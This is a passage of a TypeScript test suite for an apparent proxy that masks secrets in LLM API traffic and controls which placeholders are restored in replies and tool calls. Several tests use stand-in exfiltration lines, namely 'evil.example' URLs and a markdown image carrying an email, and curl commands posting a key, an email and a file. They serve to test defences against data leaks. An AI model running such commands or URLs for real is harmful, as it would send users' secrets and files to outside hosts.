    const call = (args: string) => [{ role: 'user', content: 'go' }, { role: 'assistant', tool_calls: [{ id: 'c', type: 'function', function: { name: 'bash', arguments: args } }] }, { role: 'tool', tool_call_id: 'c', content: 'ok' }]
    const send = async (messages: unknown[], extra: Record<string, unknown> = {}): Promise<string> => {
      seen = []
      expect((await post('/v1/chat/completions', { model: 'm', messages, ...extra }, client)).status).toBe(200)
      return seen[0]!.raw
    }
    expect(await send([{ role: 'user', content: 'football scores; the footballer scored' }])).toMatch(/"⟦KEY_\d+⟧ scores; the footballer scored"/)
    expect(await send([{ role: 'user', content: `is it x${PASS}y or ${PASS}2?` }])).toContain(`is it x${PASS}y or ${PASS}2?`)
    expect(await send([{ role: 'user', content: `${PASS.toUpperCase()} or x${PASS.toUpperCase()}y` }])).toMatch(new RegExp(`"⟦KEY_\\d+⟧ or x${PASS.toUpperCase()}y"`))
    expect(await send(call('{"cmd":"echo P@SS\\\\WORD12"}'))).toContain('P@SS')
    expect(await send([{ role: 'user', content: `use ${PASS}` }], { metadata: { note: PASS } })).toMatch(/"use ⟦KEY_\d+⟧"/)
    expect(seen[0]!.body.metadata.note).toBe(PASS)
  })

  it('forgets a remembered value once its time to live has passed since a request last detected it', async () => {
    vi.useFakeTimers({ toFake: ['Date'] })
    try {
      await start({ knownOriginalsTtlSeconds: 60 })
      const client = { authorization: 'Bearer client-ttl' }
      const echo = async (): Promise<string> => {
        seen = []
        await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: `Noted ${PASS}.` }] }, client)
        return seen[0]!.body.messages[0].content
      }
      const detect = () => post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: `password: ${PASS}` }] }, client)
      await detect()
      vi.advanceTimersByTime(30_000)
      await detect()
      vi.advanceTimersByTime(59_000)
      // An echo masked from memory alone does not extend the time to live.
      expect(await echo()).toMatch(/^Noted ⟦KEY_\d+⟧\.$/)
      vi.advanceTimersByTime(1_000)
      expect(await echo()).toBe(`Noted ${PASS}.`)
    } finally {
      vi.useRealTimers()
      await start()
    }
  })

  it('keeps a value from tool output that the user later writes through a flood of tool output, without extending its time to live', async () => {
    vi.useFakeTimers({ toFake: ['Date'] })
    try {
      await start({ knownOriginalsTtlSeconds: 60 })
      reply = () => ({ json: { choices: [] } })
      const client = { authorization: 'Bearer client-tool-echo' }
      const tool = (content: string) => [{ role: 'user', content: 'dump' }, { role: 'tool', tool_call_id: 't', content }]
      const echo = async (): Promise<string> => {
        seen = []
        await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: `again ${PASS}` }] }, client)
        return seen[0]!.body.messages[0].content
      }
      await post('/v1/chat/completions', { model: 'm', messages: tool(`password: ${PASS}`) }, client)
      vi.advanceTimersByTime(30_000)
      expect(await echo()).toMatch(/^again ⟦KEY_\d+⟧$/)
      await post('/v1/chat/completions', { model: 'm', messages: tool(Array.from({ length: 4096 }, (_, i) => `password: fl${String(i).padStart(5, '0')}Zq`).join('\n')) }, client)
      vi.advanceTimersByTime(29_000)
      expect(await echo()).toMatch(/^again ⟦KEY_\d+⟧$/)
      vi.advanceTimersByTime(1_000)
      expect(await echo()).toBe(`again ${PASS}`)
    } finally {
      vi.useRealTimers()
      await start()
    }
  })

  it('keeps a credential from tool output that the user later writes in another case through a flood of tool output, without extending its time to live', async () => {
    vi.useFakeTimers({ toFake: ['Date'] })
    try {
      await start({ knownOriginalsTtlSeconds: 60 })
      reply = () => ({ json: { choices: [] } })
      const client = { authorization: 'Bearer client-tool-echo-case' }
      const tool = (content: string) => [{ role: 'user', content: 'dump' }, { role: 'tool', tool_call_id: 't', content }]
      const echo = async (value: string): Promise<string> => {
        seen = []
        await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: `again ${value}` }] }, client)
        return seen[0]!.body.messages[0].content
      }
      await post('/v1/chat/completions', { model: 'm', messages: tool(`password: ${PASS}`) }, client)
      vi.advanceTimersByTime(30_000)
      expect(await echo(PASS.toUpperCase())).toMatch(/^again ⟦KEY_\d+⟧$/)
      await post('/v1/chat/completions', { model: 'm', messages: tool(Array.from({ length: 4096 }, (_, i) => `password: fl${String(i).padStart(5, '0')}Zq`).join('\n')) }, client)
      vi.advanceTimersByTime(29_000)
      expect(await echo(PASS.toUpperCase())).toMatch(/^again ⟦KEY_\d+⟧$/)
      expect(await echo(PASS)).toMatch(/^again ⟦KEY_\d+⟧$/)
      vi.advanceTimersByTime(1_000)
      expect(await echo(PASS.toUpperCase())).toBe(`again ${PASS.toUpperCase()}`)
    } finally {
      vi.useRealTimers()
      await start()
    }
  })

  it('never refuses a remembered value whose occurrence another detection splits, nor the same value detected earlier in the request', async () => {
    reply = () => ({ json: { choices: [] } })
    const client = { authorization: 'Bearer client-split' }
    const split = { role: 'user', content: 'call pw-0912345678 today; the pw-reset flow is broken' }
    await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: 'password: pw-0912345678' }] }, client)
    expect((await post('/v1/chat/completions', { model: 'm', messages: [split] }, client)).status).toBe(200)
    expect(seen[1]!.raw).not.toContain('0912345678')
    expect((await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: 'password: pw-0912345678' }, split] })).status).toBe(200)
    expect(seen[2]!.raw).not.toContain('0912345678')
    const upper = { role: 'user', content: 'call PW-0912345678 today; the pw-reset flow is broken' }
    expect((await post('/v1/chat/completions', { model: 'm', messages: [upper] }, client)).status).toBe(200)
    expect(seen[3]!.raw).not.toContain('0912345678')
    expect((await post('/v1/chat/completions', { model: 'm', messages: [upper], metadata: { note: 'PW-' } }, client)).status).toBe(200)
  })

  it('still refuses a detected value inside a split remembered value, and a whole value split in the same request, but not that value\'s part', async () => {
    reply = () => ({ json: { choices: [] } })
    const client = { authorization: 'Bearer client-split-scan' }
    await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: 'password: pw-0912345678' }] }, client)
    const remembered = { model: 'm', messages: [{ role: 'user', content: 'call pw-0912345678 today' }] }
    expect((await post('/v1/chat/completions', { ...remembered, metadata: { note: '0912345678' } }, client)).status).toBe(422)
    const same = { model: 'm', messages: [{ role: 'user', content: 'password: hunter2zz-0912345678; call hunter2zz-0912345678 later' }] }
    expect((await post('/v1/chat/completions', { ...same, metadata: { note: 'hunter2zz-0912345678' } })).status).toBe(422)
    // Documented in DETAILS §8: a part of a value detected in the same request is not refused.
    expect((await post('/v1/chat/completions', { ...same, metadata: { note: 'hunter2zz-' } })).status).toBe(200)
  })

  it('keeps two credentials apart when one is the other\'s JSON-escaped spelling', async () => {
    const client = { authorization: 'Bearer client-backslash' }
    const one = 'ab\\cd12ef'
    const two = 'ab\\\\cd12ef'
    reply = entry => ({ json: { choices: [{ index: 0, message: { role: 'assistant', content: placeholders(entry.raw).join(' ') } }] } })
    const ask = async (content: string) => (await (await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content }] }, client)).json() as any).choices[0].message.content
    expect(await ask(`password: ${one}`)).toBe(one)
    expect(await ask(`my new password: ${two}`)).toBe(two)
    expect(await ask(`old password: ${one}\nnew password: ${two}`)).toBe(`${one} ${two}`)
  })

  it('masks a value resent in tool arguments with \\uXXXX or \\/ escapes, and leaves an escaped backslash alone', async () => {
    reply = () => ({ json: { choices: [] } })
    const resend = async (args: string): Promise<string> => {
      seen = []
      const messages = [{ role: 'user', content: `password: ${PASS} file ${HOME}/notes.md` }, { role: 'assistant', tool_calls: [{ id: 'c', type: 'function', function: { name: 'bash', arguments: args } }] }, { role: 'tool', tool_call_id: 'c', content: 'ok' }]
      expect((await post('/v1/chat/completions', { model: 'm', messages })).status).toBe(200)
      return seen[0]!.body.messages[1].tool_calls[0].function.arguments
    }
    expect(await resend('{"cmd":"echo Tr0ub4dor\\u00263x"}')).toBe('{"cmd":"echo ⟦KEY_1⟧"}')
    expect(await resend('{"path":"\\/Users\\/fictional-user\\/notes.md"}')).toBe('{"path":"⟦PATH_1⟧/notes.md"}')
    expect(await resend('{"path":"\\u002fUsers\\u002Ffictional-user","q":"\\"\\u0022\\u005c\\u000a\\u0001\\ud83d\\ude00\\ud83d\\u0041\\udc00"}')).toBe('{"path":"⟦PATH_1⟧","q":"\\"\\"\\\\\\n\\u0001😀\\ud83dA\\udc00"}')
    expect(await resend('{"cmd":"a\\\\u0026b \\\\/ \\u005cu0026"}')).toBe('{"cmd":"a\\\\u0026b \\\\/ \\\\u0026"}')
  })

  it('masks a value resent in tool arguments as a surrogate pair, or with a quote or backslash written \\uXXXX, and restores it as written', async () => {
    await start({ redaction: { terms: ['𠀋氏'] } })
    try {
      reply = entry => ({ json: { choices: [{ index: 0, message: { role: 'assistant', tool_calls: [{ id: 'd', type: 'function', function: { name: 'bash', arguments: JSON.stringify({ v: placeholders(entry.raw)[0] }) } }] } }] } })
      const cases: Array<[user: string, args: string, value: string]> = [
        ['password: p@ss🔑word12', '{"cmd":"echo p@ss\\ud83d\\udd11word12"}', 'p@ss🔑word12'],
        ['contact 𠀋氏 today', '{"name":"\\ud840\\udc0b\\u6c0f"}', '𠀋氏'],
        ['password: ab"cd12ef', '{"cmd":"echo ab\\u0022cd12ef"}', 'ab"cd12ef'],
        ['password: ab\\cd12ef', '{"cmd":"echo ab\\u005ccd12ef"}', 'ab\\cd12ef'],
      ]
      for (const [user, args, value] of cases) {
        seen = []
        const messages = [{ role: 'user', content: user }, { role: 'assistant', tool_calls: [{ id: 'c', type: 'function', function: { name: 'bash', arguments: args } }] }, { role: 'tool', tool_call_id: 'c', content: 'ok' }]
        const res = await post('/v1/chat/completions', { model: 'm', messages })
        expect(res.status).toBe(200)
        const sent = seen[0]!.body.messages[1].tool_calls[0].function.arguments
        expect(sent).toMatch(/^\{"(cmd|name)":"(echo )?⟦(KEY|TERM)_1⟧"\}$/)
        expect(JSON.parse((await res.json() as any).choices[0].message.tool_calls[0].function.arguments).v).toBe(value)
      }
    } finally {
      await start()
    }
  })

  it('keeps a credential from the system prompt through a flood of tool output', async () => {
    reply = () => ({ json: { choices: [] } })
    const client = { authorization: 'Bearer flood-system' }
    const cookies = Array.from({ length: 4200 }, (_, i) => `Cookie: sessionid=s${String(i).padStart(5, '0')}f8a9c2d1e4b7a6c3`).join('\n')
    await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'system', content: `Use password: ${PASS} for the db` }, { role: 'user', content: 'hi' }] }, client)
    await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: 'dump' }, { role: 'tool', tool_call_id: 't', content: cookies }] }, client)
    await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: `Noted ${PASS}.` }] }, client)
    expect(seen[2]!.body.messages[0].content).toMatch(/^Noted ⟦KEY_\d+⟧\.$/)
  })

  it('keeps a credential from an Anthropic system string or block, or Responses instructions, through a flood of tool output', async () => {
    reply = () => ({ json: {} })
    const cookies = Array.from({ length: 4200 }, (_, i) => `Cookie: sessionid=s${String(i).padStart(5, '0')}f8a9c2d1e4b7a6c3`).join('\n')
    const system = `Use password: ${PASS} for the db`
    const messages = async (key: string, prompt: unknown): Promise<string> => {
      seen = []
      const client = { 'x-api-key': key }
      await post('/v1/messages', { model: 'c', max_tokens: 1, system: prompt, messages: [{ role: 'user', content: 'hi' }] }, client)
      const flood = [{ role: 'user', content: 'dump' }, { role: 'assistant', content: [{ type: 'tool_use', id: 't', name: 'dump', input: {} }] }, { role: 'user', content: [{ type: 'tool_result', tool_use_id: 't', content: cookies }] }]
      await post('/v1/messages', { model: 'c', max_tokens: 1, messages: flood }, client)
      await post('/v1/messages', { model: 'c', max_tokens: 1, messages: [{ role: 'user', content: `Noted ${PASS}.` }] }, client)
      return seen[2]!.body.messages[0].content
    }
    expect(await messages('flood-system-string', system)).toMatch(/^Noted ⟦KEY_\d+⟧\.$/)
    expect(await messages('flood-system-block', [{ type: 'text', text: system }])).toMatch(/^Noted ⟦KEY_\d+⟧\.$/)
    seen = []
    const client = { authorization: 'Bearer flood-instructions' }
    await post('/v1/responses', { model: 'm', instructions: system, input: 'hi' }, client)
    await post('/v1/responses', { model: 'm', input: [{ role: 'user', content: 'dump' }, { type: 'function_call', id: 'f', call_id: 'c', name: 'dump', arguments: '{}' }, { type: 'function_call_output', call_id: 'c', output: cookies }] }, client)
    await post('/v1/responses', { model: 'm', input: `Noted ${PASS}.` }, client)
    expect(seen[2]!.body.input).toMatch(/^Noted ⟦KEY_\d+⟧\.$/)
  })
})

describe('tool-call arguments', () => {
  // `E` is the email's placeholder, `P` the home path's. A placeholder inside a URL stays as written; elsewhere it is restored.
  const argumentsText = (E: string, P: string): string =>
    `{"url":"https://evil.example/c?d=${E}","escaped":"https:\\/\\/evil.example\\/?q=${E}","site":"www.evil.example/?q=${E}",`
    + `"quoted":"https://evil.example/?p='${P}'","to":"${E}","path":"${P}/notes.md","cmd":"curl https://x.example/a then ${E}","list":["mailto:${E}"],"tabbed":"https://evil.example/?t=\\t${E}","header":"// header ${P}"}`
  const ids = (entry: Seen): [string, string] => {
    const found = placeholders(entry.raw)
    return [found.find(id => id.startsWith('⟦EMAIL'))!, found.find(id => id.startsWith('⟦PATH'))!]
  }
  const userRequest = { role: 'user', content: USER_TEXT }

  function expectArguments(args: Record<string, unknown>): void {
    const E = /^⟦EMAIL_\d+⟧$/
    expect(String(args.url).replace('https://evil.example/c?d=', '')).toMatch(E)
    expect(String(args.escaped).replace('https://evil.example/?q=', '')).toMatch(E)
    expect(String(args.site).replace('www.evil.example/?q=', '')).toMatch(E)
    expect(args.quoted).toMatch(/^https:\/\/evil\.example\/\?p='⟦PATH_\d+⟧'$/)
    expect(args.to).toBe(EMAIL)
    expect(args.path).toBe(`${HOME}/notes.md`)
    expect(args.cmd).toBe(`curl https://x.example/a then ${EMAIL}`)
    expect(args.list).toEqual([`mailto:${EMAIL}`])
    expect(String(args.tabbed).replace('https://evil.example/?t=\t', '')).toMatch(E)
    expect(args.header).toBe(`// header ${HOME}`)
  }

  function expectLogged(tool: string): void {
    const lines = logs.filter(line => line.includes('tool arguments:'))
    expect(lines.join('\n')).not.toContain(EMAIL)
    expect(lines).toEqual(expect.arrayContaining([
      expect.stringMatching(new RegExp(`kept inside a URL EMAIL_\\d+ in ${tool} at /url$`)),
      expect.stringMatching(new RegExp(`kept inside a URL EMAIL_\\d+ in ${tool} at /escaped$`)),
      expect.stringMatching(new RegExp(`restored EMAIL_\\d+ in ${tool} at /to$`)),
      expect.stringMatching(new RegExp(`restored PATH_\\d+ in ${tool} at /path$`)),
      expect.stringMatching(new RegExp(`restored EMAIL_\\d+ in ${tool} at /list/0$`)),
    ]))
    expect(logs.at(-1)).toMatch(/ kept [1-9]\d* /)
  }

  it.each([1, 3])('Chat stream, %i-character chunks', async size => {
    reply = entry => {
      const env = { id: 'c', object: 'chat.completion.chunk', model: 'm' }
      const call = (part: string, first: boolean) => ({ index: 0, ...first ? { id: 't', type: 'function' } : {}, function: { ...first ? { name: 'fetch' } : {}, arguments: part } })
      return {
        sse: [
          ...sse(chunk(argumentsText(...ids(entry)), size).map((part, i) => [undefined, { ...env, choices: [{ index: 0, delta: { tool_calls: [call(part, i === 0)] }, finish_reason: null }] }])),
          ...sse([[undefined, { ...env, choices: [{ index: 0, delta: {}, finish_reason: 'tool_calls' }] }], [undefined, '[DONE]']]),
        ],
      }
    }
    const text = await (await post('/v1/chat/completions', { model: 'm', stream: true, messages: [userRequest] })).text()
    const args = events(text).flatMap(event => event.choices[0].delta.tool_calls ?? []).map((call: any) => call.function.arguments).join('')
    expectArguments(JSON.parse(args))
    expectLogged('fetch')
  })

  it('Chat JSON reply', async () => {
    reply = entry => ({ json: { choices: [{ index: 0, message: { role: 'assistant', tool_calls: [{ id: 't', type: 'function', function: { name: 'fetch', arguments: argumentsText(...ids(entry)) } }] } }] } })
    const body = await (await post('/v1/chat/completions', { model: 'm', messages: [userRequest] })).json() as any
    expectArguments(JSON.parse(body.choices[0].message.tool_calls[0].function.arguments))
    expectLogged('fetch')
  })

  it.each([1, 2])('Anthropic stream, %i-character chunks', async size => {
    reply = entry => ({
      sse: sse([
        ['message_start', { type: 'message_start', message: { id: 'm', role: 'assistant', content: [] } }],
        ['content_block_start', { type: 'content_block_start', index: 0, content_block: { type: 'tool_use', id: 'tu', name: 'web_fetch', input: {} } }],
        ...chunk(argumentsText(...ids(entry)), size).map((part): [string, unknown] => ['content_block_delta', { type: 'content_block_delta', index: 0, delta: { type: 'input_json_delta', partial_json: part } }]),
        ['content_block_stop', { type: 'content_block_stop', index: 0 }],
        ['message_stop', { type: 'message_stop' }],
      ]),
    })
    const text = await (await post('/v1/messages', { model: 'c', max_tokens: 1, stream: true, messages: [userRequest] }, { 'x-api-key': 'k' })).text()
    expectArguments(JSON.parse(events(text).filter(e => e.delta?.type === 'input_json_delta').map(e => e.delta.partial_json).join('')))
    expectLogged('web_fetch')
  })

  it('Anthropic JSON reply: tool input as an object', async () => {
    reply = entry => ({ json: { id: 'm', type: 'message', content: [{ type: 'tool_use', id: 'tu', name: 'web_fetch', input: JSON.parse(argumentsText(...ids(entry))) }] } })
    const body = await (await post('/v1/messages', { model: 'c', max_tokens: 1, messages: [userRequest] }, { 'x-api-key': 'k' })).json() as any
    expectArguments(body.content[0].input)
    expectLogged('web_fetch')
  })

  it.each([1, 3])('Responses stream, %i-character chunks, and the repeated done events', async size => {
    reply = entry => {
      const args = argumentsText(...ids(entry))
      const item = { id: 'fc', type: 'function_call', call_id: 'call', name: 'fetch', arguments: '' }
      return {
        sse: sse([
          ['response.output_item.added', { type: 'response.output_item.added', output_index: 0, item }],
          ...chunk(args, size).map((part): [string, unknown] => ['response.function_call_arguments.delta', { type: 'response.function_call_arguments.delta', item_id: 'fc', output_index: 0, delta: part }]),
          ['response.function_call_arguments.done', { type: 'response.function_call_arguments.done', item_id: 'fc', output_index: 0, arguments: args }],
          ['response.output_item.done', { type: 'response.output_item.done', output_index: 0, item: { ...item, arguments: args } }],
          ['response.completed', { type: 'response.completed', response: { id: 'r-tool', output: [{ ...item, arguments: args }] } }],
        ]),
      }
    }
    const all = events(await (await post('/v1/responses', { model: 'm', stream: true, input: USER_TEXT })).text())
    expectArguments(JSON.parse(all.filter(e => e.type === 'response.function_call_arguments.delta').map(e => e.delta).join('')))
    expectArguments(JSON.parse(all.find(e => e.type === 'response.function_call_arguments.done').arguments))
    expectArguments(JSON.parse(all.find(e => e.type === 'response.output_item.done').item.arguments))
    expectArguments(JSON.parse(all.find(e => e.type === 'response.completed').response.output[0].arguments))
    expectLogged('fetch')
    // Each distinct line is logged once, though the arguments arrive four times.
    expect(logs.filter(line => line.includes(' at /to'))).toHaveLength(1)
  })

  it('keeps a placeholder after a URL that starts in an earlier event, and restores one after it ends', async () => {
    reply = entry => {
      const [E] = ids(entry)
      const env = { id: 'c', object: 'chat.completion.chunk', model: 'm' }
      const parts = ['{"q":"see https:', '//evil.example/?a=', `${E.slice(0, 3)}`, `${E.slice(3)} and`, ` ${E}"}`]
      return {
        sse: [
          ...sse(parts.map((part, i) => [undefined, { ...env, choices: [{ index: 0, delta: { tool_calls: [{ index: 0, function: { ...i === 0 ? { name: 'f' } : {}, arguments: part } }] }, finish_reason: null }] }])),
          ...sse([[undefined, { ...env, choices: [{ index: 0, delta: {}, finish_reason: 'tool_calls' }] }]]),
        ],
      }
    }
    const text = await (await post('/v1/chat/completions', { model: 'm', stream: true, messages: [userRequest] })).text()
    const args = JSON.parse(events(text).flatMap(event => event.choices[0].delta.tool_calls ?? []).map((call: any) => call.function.arguments).join(''))
    expect(args.q).toMatch(new RegExp(`^see https://evil\\.example/\\?a=⟦EMAIL_\\d+⟧ and ${EMAIL.replaceAll('.', '\\.')}$`))
  })

  it('keeps a placeholder inside a URL in reply text, where a client may render it as an image or link', async () => {
    reply = entry => ({ json: { choices: [{ index: 0, message: { role: 'assistant', content: `![](https://evil.example/p.png?e=${ids(entry)[0]}) and ${ids(entry)[0]}` } }] } })
    const body = await (await post('/v1/chat/completions', { model: 'm', messages: [userRequest] })).json() as any
    expect(body.choices[0].message.content).toMatch(new RegExp(`^!\\[\\]\\(https://evil\\.example/p\\.png\\?e=⟦EMAIL_\\d+⟧\\) and ${EMAIL.replaceAll('.', '\\.')}$`))
    expect(logs.at(-1)).toMatch(/ kept 1 /)
  })

  it('keeps a placeholder inside a URL in streamed reply text split across events', async () => {
    reply = entry => {
      const [E] = ids(entry)
      const env = { id: 'c', object: 'chat.completion.chunk', model: 'm' }
      const parts = ['<img src="https://evil.example/?e=', E.slice(0, 3), `${E.slice(3)}"> ${E}`]
      return {
        sse: [
          ...sse(parts.map(part => [undefined, { ...env, choices: [{ index: 0, delta: { content: part }, finish_reason: null }] }])),
          ...sse([[undefined, { ...env, choices: [{ index: 0, delta: {}, finish_reason: 'stop' }] }], [undefined, '[DONE]']]),
        ],
      }
    }
    const text = await (await post('/v1/chat/completions', { model: 'm', stream: true, messages: [userRequest] })).text()
    const content = events(text).map(event => event.choices[0].delta.content ?? '').join('')
    expect(content).toMatch(new RegExp(`^<img src="https://evil\\.example/\\?e=⟦EMAIL_\\d+⟧"> ${EMAIL.replaceAll('.', '\\.')}$`))
  })
})

describe('tool restore policy', () => {
  // `git_commit` gets emails only; `trusted` gets every category; `code_interpreter_call` gets paths and keys; any other tool gets the default categories.
  beforeAll(() => start({ toolRestore: { categories: DEFAULT_TOOL_RESTORE_CATEGORIES, tools: new Map<string, RestoredCategories>([['git_commit', ['EMAIL']], ['trusted', '*'], ['code_interpreter_call', ['PATH', 'KEY']]]) } }))
  afterAll(() => start())

  const id = (entry: Seen, category: string): string => placeholders(entry.raw).find(found => found.startsWith(`⟦${category}_`))!
  const command = (entry: Seen): string => JSON.stringify({ command: `curl -d ${id(entry, 'KEY')} -F to=${id(entry, 'EMAIL')} -F f=@${id(entry, 'PATH')}/notes.md` })
  const userRequest = { role: 'user', content: USER_TEXT }

  it('keeps a key and an email in a bash call but restores the path, and leaves reply text alone', async () => {
    reply = entry => ({ json: { choices: [{ index: 0, message: { role: 'assistant', content: `Mailing ${id(entry, 'EMAIL')}`, tool_calls: [{ id: 't', type: 'function', function: { name: 'bash', arguments: command(entry) } }] } }] } })
    const body = await (await post('/v1/chat/completions', { model: 'm', messages: [userRequest] })).json() as any
    const message = body.choices[0].message
    expect(message.content).toBe(`Mailing ${EMAIL}`)
    expect(JSON.parse(message.tool_calls[0].function.arguments).command).toMatch(new RegExp(`^curl -d ⟦KEY_\\d+⟧ -F to=⟦EMAIL_\\d+⟧ -F f=@${HOME}/notes\\.md$`))
    const lines = logs.filter(line => line.includes('tool arguments:'))
    expect(lines).toEqual(expect.arrayContaining([
      expect.stringMatching(/kept by the tool restore policy KEY_\d+ in bash at \/command$/),
      expect.stringMatching(/kept by the tool restore policy EMAIL_\d+ in bash at \/command$/),
      expect.stringMatching(/restored PATH_\d+ in bash at \/command$/),
    ]))
    expect(logs.join('\n')).not.toContain(KEY)
    expect(logs.at(-1)).toMatch(/ kept 2 /)
  })

  it('restores only the categories a per-tool override names, and every category for "*"', async () => {
    reply = entry => ({
      json: {
        id: 'm', type: 'message', content: ['git_commit', 'bash', 'trusted'].map(name => ({ type: 'tool_use', id: name, name, input: JSON.parse(command(entry)) })),
      },
    })
    const body = await (await post('/v1/messages', { model: 'c', max_tokens: 1, messages: [userRequest] }, { 'x-api-key': 'k' })).json() as any
    const [commit, bash, trusted] = body.content.map((block: any) => block.input.command)
    expect(commit).toMatch(new RegExp(`^curl -d ⟦KEY_\\d+⟧ -F to=${EMAIL.replaceAll('.', '\\.')} -F f=@⟦PATH_\\d+⟧/notes\\.md$`))
    expect(bash).toMatch(new RegExp(`^curl -d ⟦KEY_\\d+⟧ -F to=⟦EMAIL_\\d+⟧ -F f=@${HOME}/notes\\.md$`))
    expect(trusted).toBe(`curl -d ${KEY} -F to=${EMAIL} -F f=@${HOME}/notes.md`)
  })

  it.each([1, 3])('applies the policy to a Chat stream split into %i-character chunks', async size => {
    reply = entry => {
      const env = { id: 'c', object: 'chat.completion.chunk', model: 'm' }
      const call = (part: string, first: boolean) => ({ index: 0, function: { ...first ? { name: 'bash' } : {}, arguments: part } })
      return {
        sse: [
          ...sse(chunk(command(entry), size).map((part, i) => [undefined, { ...env, choices: [{ index: 0, delta: { tool_calls: [call(part, i === 0)] }, finish_reason: null }] }])),
          ...sse([[undefined, { ...env, choices: [{ index: 0, delta: {}, finish_reason: 'tool_calls' }] }], [undefined, '[DONE]']]),
        ],
      }
    }
    const text = await (await post('/v1/chat/completions', { model: 'm', stream: true, messages: [userRequest] })).text()
    const args = events(text).flatMap(event => event.choices[0].delta.tool_calls ?? []).map((call: any) => call.function.arguments).join('')
    expect(JSON.parse(args).command).toMatch(new RegExp(`^curl -d ⟦KEY_\\d+⟧ -F to=⟦EMAIL_\\d+⟧ -F f=@${HOME}/notes\\.md$`))
  })

  it('applies the per-tool override to a Responses stream, whose deltas name the tool only by item id', async () => {
    reply = entry => {
      const args = command(entry)
      const item = { id: 'fc', type: 'function_call', call_id: 'call', name: 'git_commit', arguments: '' }
      return {
        sse: sse([
          ['response.output_item.added', { type: 'response.output_item.added', output_index: 0, item }],
          ...chunk(args, 2).map((part): [string, unknown] => ['response.function_call_arguments.delta', { type: 'response.function_call_arguments.delta', item_id: 'fc', output_index: 0, delta: part }]),
          ['response.function_call_arguments.done', { type: 'response.function_call_arguments.done', item_id: 'fc', output_index: 0, arguments: args }],
        ]),
      }
    }
    const all = events(await (await post('/v1/responses', { model: 'm', stream: true, input: USER_TEXT })).text())
    const streamed = JSON.parse(all.filter(e => e.type === 'response.function_call_arguments.delta').map(e => e.delta).join('')).command
    expect(streamed).toBe(JSON.parse(all.find(e => e.type === 'response.function_call_arguments.done').arguments).command)
    expect(streamed).toMatch(new RegExp(`^curl -d ⟦KEY_\\d+⟧ -F to=${EMAIL.replaceAll('.', '\\.')} -F f=@⟦PATH_\\d+⟧/notes\\.md$`))
  })

  // What the default categories leave of `line`: the key and the email kept, the path restored.
  const line = (entry: Seen): string => JSON.parse(command(entry)).command
  const DEFAULT_KEPT = new RegExp(`^curl -d ⟦KEY_\\d+⟧ -F to=⟦EMAIL_\\d+⟧ -F f=@${HOME}/notes\\.md$`)

  it('applies the policy to every Responses output item whose type ends in _call, named by its type when it has no name', async () => {
    const items = (entry: Seen) => [
      { type: 'local_shell_call', id: 'ls', call_id: 'c1', status: 'completed', action: { type: 'exec', command: ['bash', '-lc', line(entry)] } },
      { type: 'shell_call', id: 'sh', call_id: 'c2', action: { commands: [line(entry)] } },
      { type: 'computer_call', id: 'cc', call_id: 'c3', action: { type: 'type', text: line(entry) } },
      { type: 'apply_patch_call', id: 'ap', call_id: 'c4', operation: { type: 'create_file', path: 'x.txt', diff: line(entry) } },
      { type: 'custom_tool_call', id: 'ct', call_id: 'c5', name: 'bash', input: line(entry) },
    ]
    const payloads = (output: any[]): string[] => {
      const [shell, shells, computer, patch, custom] = output
      return [shell.action.command[2], shells.action.commands[0], computer.action.text, patch.operation.diff, custom.input]
    }
    reply = entry => ({ json: { id: 'r-calls', output: items(entry) } })
    const body = await (await post('/v1/responses', { model: 'm', input: USER_TEXT })).json() as any
    for (const payload of payloads(body.output)) expect(payload).toMatch(DEFAULT_KEPT)
    expect(logs).toEqual(expect.arrayContaining([expect.stringMatching(/kept by the tool restore policy KEY_\d+ in local_shell_call at \/action\/command\/2$/)]))

    reply = entry => ({
      sse: sse([
        ...items(entry).map((item, index): [string, unknown] => ['response.output_item.done', { type: 'response.output_item.done', output_index: index, item }]),
        ['response.completed', { type: 'response.completed', response: { id: 'r-calls-stream', output: items(entry) } }],
      ]),
    })
    const all = events(await (await post('/v1/responses', { model: 'm', stream: true, input: USER_TEXT })).text())
    for (const payload of payloads(all.filter(e => e.type === 'response.output_item.done').map(e => e.item))) expect(payload).toMatch(DEFAULT_KEPT)
    for (const payload of payloads(all.find(e => e.type === 'response.completed').response.output)) expect(payload).toMatch(DEFAULT_KEPT)
  })

  it('applies the policy to a Chat custom tool call, in a JSON reply and in a stream', async () => {
    reply = entry => ({ json: { choices: [{ index: 0, message: { role: 'assistant', tool_calls: [{ id: 't', type: 'custom', custom: { name: 'bash', input: line(entry) } }] } }] } })
    const body = await (await post('/v1/chat/completions', { model: 'm', messages: [userRequest] })).json() as any
    expect(body.choices[0].message.tool_calls[0].custom.input).toMatch(DEFAULT_KEPT)

    reply = entry => {
      const env = { id: 'c', object: 'chat.completion.chunk', model: 'm' }
      const call = (part: string, first: boolean) => ({ index: 0, ...first ? { id: 't', type: 'custom' } : {}, custom: { ...first ? { name: 'bash' } : {}, input: part } })
      return {
        sse: [
          // Ends inside a held placeholder prefix, so the finishing chunk carries the tail.
          ...sse(chunk(`${line(entry)} ${id(entry, 'KEY')}`.slice(0, -2), 3).map((part, i) => [undefined, { ...env, choices: [{ index: 0, delta: { tool_calls: [call(part, i === 0)] }, finish_reason: null }] }])),
          ...sse([[undefined, { ...env, choices: [{ index: 0, delta: {}, finish_reason: 'tool_calls' }] }], [undefined, '[DONE]']]),
        ],
      }
    }
    const text = await (await post('/v1/chat/completions', { model: 'm', stream: true, messages: [userRequest] })).text()
    const calls = events(text).flatMap(event => event.choices[0].delta.tool_calls ?? [])
    expect(calls.every((call: any) => call.function === undefined)).toBe(true)
    const input = calls.map((call: any) => call.custom.input).join('')
    expect(input.slice(0, input.lastIndexOf(' '))).toMatch(DEFAULT_KEPT)
    expect(input).toMatch(/ ⟦KEY_\d*$/)
  })

  it('looks up a per-tool override by trimmed, case-folded name', async () => {
    reply = entry => ({ json: { choices: [{ index: 0, message: { role: 'assistant', tool_calls: ['Git_Commit', ' git_commit '].map((name, i) => ({ id: `t${i}`, type: 'function', function: { name, arguments: command(entry) } })) } }] } })
